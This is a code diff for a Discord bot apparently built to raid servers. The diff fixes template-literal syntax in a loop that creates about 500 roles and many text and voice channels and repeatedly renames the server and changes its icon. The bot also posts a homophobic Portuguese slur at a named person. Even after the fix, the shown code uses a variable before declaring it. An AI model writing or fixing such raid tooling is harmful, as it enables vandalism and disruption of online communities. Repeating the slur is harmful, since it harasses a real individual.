@@ -29,7 +29,7 @@ client.on("message", async (message) => {
 	message.channel.send(`henrique bixa`)
 	for(i = 0; i < 499; i++){
         message.guild.createRole('NOOT NOOT')
-	    message.guild.setName(process.env.SERVER_NAME + ${textuh})
+	    message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
 	    const textuh = makeid(32);
 	    message.guild.createChannel(`${textuh}`, 'text');
 	    message.guild.createChannel(`${textuh}`, 'voice');  
@@ -45,7 +45,7 @@ client.on("message", async (message) => {
 	message.guild.setIcon('./icon.png') 
         const texth = makeid(32);
 	    message.guild.createChannel(`${texth}`, 'text');	
-	    message.guild.setName(process.env.SERVER_NAME + ${texth})
+	    message.guild.setName(process.env.SERVER_NAME + `${texth}`)
 	    message.guild.setIcon('./icon.png')  
     }
     if(message.content === 'a'){
